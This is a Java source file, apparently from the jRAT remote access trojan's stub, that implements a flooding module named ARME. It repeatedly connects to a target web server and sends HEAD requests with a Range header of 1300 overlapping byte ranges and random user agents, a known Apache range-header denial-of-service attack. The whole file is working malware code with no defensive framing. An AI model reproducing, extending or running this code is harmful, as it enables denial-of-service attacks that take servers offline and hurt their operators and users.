package se.jrat.stub.flood;

import java.io.PrintWriter;
import java.net.Socket;

import se.jrat.stub.Constants;


public class ARME implements Runnable {

	public String target;
	public int port;

	public ARME(String t, int p) {
		target = t;
		port = p;
	}

	public void run() {
		while (Constants.flooding) {
			try {
				Socket sock = new Socket(target, port);
				String p = "";
				for (int i = 0; i < 1300; i++) {
					p += ",5-" + i;
				}
				PrintWriter pw = new PrintWriter(sock.getOutputStream());
				pw.println("HEAD / HTTP/1.1");
				pw.println("Host: " + target);
				pw.println("User-Agent: " + Useragents.getRandomUserAgent());
				pw.println("Range:bytes=0-" + p);
				pw.println("Accept-Encoding: gzip");
				pw.println("Connection: close");
				pw.println();
				pw.flush();
				sock.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
